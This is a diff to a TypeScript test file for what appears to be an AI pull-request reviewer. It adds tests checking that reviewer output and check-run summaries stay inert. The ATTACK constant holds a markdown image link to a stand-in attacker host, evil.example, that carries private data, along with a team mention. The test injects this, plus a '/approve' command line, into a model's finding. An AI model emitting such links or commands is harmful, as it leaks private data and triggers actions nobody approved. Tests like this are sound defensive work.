@@ -12,6 +12,7 @@ import { Value } from "typebox/value";
 import { fauxAssistantMessage, fauxText, type FauxResponseFactory } from "@earendil-works/pi-ai";
 import { createPiSdkAgentStep, createScriptedProvider, type Script } from "../agent/index.ts";
 import { decodeMarkers, encodeMarker, fingerprintFinding, RunRecord, type ProducerFinding, type WaitingInput } from "../core/index.ts";
+import { assertInert, assertNoCommandLines } from "../core/markdown-testing.ts";
 import { DryRunPlatform, FixturePrReader, type PrComment, type PrReader } from "../platform/index.ts";
 import { snapshotLookup } from "./lookup.ts";
 import { type ConfigInputs } from "./config.ts";
@@ -420,6 +421,45 @@ describe("refuted finding (S-5)", () => {
     assert.ok(!calls.includes("verifier"));
     assert.match(platform.output.review!.body, /no verifier model is configured/);
     assert.ok(platform.output.review!.comments.every((c) => !c.body.startsWith("**Important.**") || c.body.includes("_Unverified:")));
+  });
+});
+
+describe("posted text is inert end to end (H-51, C-3)", () => {
+  const ATTACK = "![x](https://evil.example/p?q=PRIVATE) cc @org/team";
+
+  test("reviewer output, with the fingerprint taken from the raw finding", async () => {
+    const script = basicScript();
+    type Call = { arguments: ProducerFinding };
+    const first = (script.reviewer![0] as unknown as { toolCalls: Call[] }).toolCalls[0]!.arguments;
+    first.title = `${first.title} ${ATTACK}`;
+    first.body = `${first.body}\n\n${ATTACK}\n/approve`;
+    const { result, platform } = await run({ script });
+    const review = platform.output.review!;
+    for (const body of [review.body, ...review.comments.map((c) => c.body)]) {
+      // The one link that stays live is an issue of this repository (I-2 #4).
+      assertInert(body.replace(/Existing issue: https:\/\/github\.com\/example\/widget\/issues\/\d+/g, ""));
+      assertNoCommandLines(body);
+    }
+    const kept = readRecord(result).findings.find((f) => f.title === first.title);
+    assert.equal(kept?.status, "published");
+    assert.ok(review.comments.some((c) => c.body.includes(kept!.fingerprint)));
+    assert.equal(kept!.fingerprint, fingerprintFinding(first, snapshotLookup({ head: join(BASIC, "head") })));
+  });
+
+  test("the check run's summary, also when it would be cut", async () => {
+    for (const reason of [ATTACK, `${"x".repeat(3_990)} \`${ATTACK}\``, `${"`x` ".repeat(30_000)}${ATTACK}`]) {
+      const fixture = new FixturePrReader(BASIC);
+      const reader: PrReader = {
+        kind: fixture.kind,
+        getPullRequest: () => fixture.getPullRequest(),
+        listComments: () => fixture.listComments(),
+        getDiff: () => Promise.reject(new Error(reason)),
+      };
+      const { platform } = await run({ script: basicScript(), reader: () => reader });
+      assertInert(platform.output.check_run!.output!.summary);
+      assert.ok(platform.output.check_run!.output!.summary.length < 65_535);
+      assertInert(platform.output.failure_comment!);
+    }
   });
 });
 
